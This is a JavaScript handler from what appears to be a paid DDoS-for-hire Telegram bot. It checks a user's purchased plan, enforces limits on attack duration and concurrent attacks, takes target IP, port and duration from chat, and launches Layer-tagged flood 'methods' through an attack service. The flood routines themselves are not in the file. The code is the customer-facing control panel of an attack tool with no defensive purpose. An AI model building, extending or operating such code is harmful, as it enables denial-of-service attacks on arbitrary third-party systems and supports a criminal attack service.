const userService = require('../services/userService');
const attackService = require('../services/attackService');
const { formatMethodsList } = require('../utils/commands');
const { backToMenuKeyboard, methodsKeyboard } = require('../utils/keyboards');

const methodSessions = new Map();

class AttackHandler {
  setMethodSession(telegramId, method) {
    methodSessions.set(String(telegramId), method);
  }

  clearMethodSession(telegramId) {
    methodSessions.delete(String(telegramId));
  }

  getMethodSession(telegramId) {
    return methodSessions.get(String(telegramId)) || null;
  }

  sendCommandsHelp(bot, chatId, telegramId) {
    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(chatId, 'No plan. Buy one and wait for owner approval.', {
        reply_markup: backToMenuKeyboard()
      });
      return;
    }

    const limits = plan.isOwner
      ? 'Limits: unlimited'
      : `Max ${plan.maxDuration}s | ${plan.concurrent}c | active ${attackService.getActiveCount(telegramId)}`;

    bot.sendMessage(chatId, `${formatMethodsList()}\n\n${limits}`, { reply_markup: methodsKeyboard() });
  }

  getMethodPrompt(method) {
    return `${method.name} (Layer ${method.layer})\nCommand: /${method.command}\n\nSend target:\nip port duration\n\nExample:\n1.2.3.4 80 60`;
  }

  async runAttack(bot, chatId, telegramId, username, method, target, port, duration) {
    const plan = userService.getActivePlan(telegramId);

    if (!plan) {
      bot.sendMessage(chatId, 'No active plan.', { reply_markup: backToMenuKeyboard() });
      return false;
    }

    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      bot.sendMessage(chatId, 'Bad port.');
      return false;
    }

    if (!Number.isInteger(duration) || duration < 1) {
      bot.sendMessage(chatId, 'Bad duration.');
      return false;
    }

    if (!plan.isOwner && duration > plan.maxDuration) {
      bot.sendMessage(chatId, `Max duration is ${plan.maxDuration}s on your plan.`);
      return false;
    }

    if (!attackService.canLaunch(telegramId, plan.concurrent)) {
      bot.sendMessage(chatId, `Concurrent limit reached (${plan.concurrent}).`);
      return false;
    }

    const statusMsg = await bot.sendMessage(
      chatId,
      `Starting ${method.name}\n${target}:${port} for ${duration}s`
    );

    const result = attackService.launchAttack({
      telegramId,
      username,
      target,
      port,
      method: method.name,
      duration,
      maxConcurrent: plan.concurrent
    });

    if (result.error === 'concurrent_limit') {
      bot.editMessageText(`All ${result.max} slots in use.`, {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
      return false;
    }

    bot.editMessageText(
      `Running ${method.name}\n${target}:${port} | ${duration}s\nSlots: ${attackService.getActiveCount(telegramId)}/${plan.isOwner ? 'inf' : plan.concurrent}`,
      { chat_id: chatId, message_id: statusMsg.message_id, reply_markup: backToMenuKeyboard() }
    );

    setTimeout(() => {
      bot.sendMessage(chatId, `Done ${method.name} on ${target}:${port}`).catch(() => {});
    }, duration * 1000);

    return true;
  }

  async handleAttackCommand(bot, msg, match, method) {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    userService.registerUser(msg.from);

    const target = match[1]?.trim();
    const port = Number(match[2]);
    const duration = Number(match[3]);

    if (!target) {
      bot.sendMessage(chatId, `Usage: /${method.command} ip port duration`);
      return;
    }

    await this.runAttack(bot, chatId, telegramId, msg.from.username, method, target, port, duration);
  }

  async handleTapInput(bot, msg) {
    const telegramId = msg.from.id;
    const method = this.getMethodSession(telegramId);

    if (!method) {
      return false;
    }

    const chatId = msg.chat.id;
    const parts = msg.text.trim().split(/\s+/);

    if (parts.length < 3) {
      bot.sendMessage(chatId, `Send: ip port duration\nExample: 1.2.3.4 80 60`);
      return true;
    }

    const [target, portStr, durationStr] = parts;
    const port = Number(portStr);
    const duration = Number(durationStr);

    userService.registerUser(msg.from);
    this.clearMethodSession(telegramId);

    const ok = await this.runAttack(
      bot,
      chatId,
      telegramId,
      msg.from.username,
      method,
      target,
      port,
      duration
    );

    if (ok) {
      bot.sendMessage(chatId, `Method cleared. Tap Methods to pick another.`, {
        reply_markup: backToMenuKeyboard()
      }).catch(() => {});
    }

    return true;
  }
}

module.exports = new AttackHandler();
